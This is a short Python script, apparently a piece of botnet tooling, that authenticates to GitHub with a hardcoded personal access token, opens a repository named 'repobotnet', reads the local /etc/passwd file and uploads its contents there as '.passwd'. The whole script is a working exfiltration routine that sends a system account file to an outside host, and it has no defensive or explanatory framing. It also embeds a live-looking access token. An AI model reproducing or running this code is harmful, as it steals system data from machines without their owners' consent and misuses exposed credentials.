import github
import os

# Authenticate with GitHub using a personal access token
g = github.Github("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")

# Get the repository
repo = g.get_user().get_repo("repobotnet")

# Open the passwd file in binary mode
with open("/etc/passwd", "rb") as f:
    # Create a new file in the repository
    repo.create_file(".passwd", "Uploading passwd file", f.read())
    
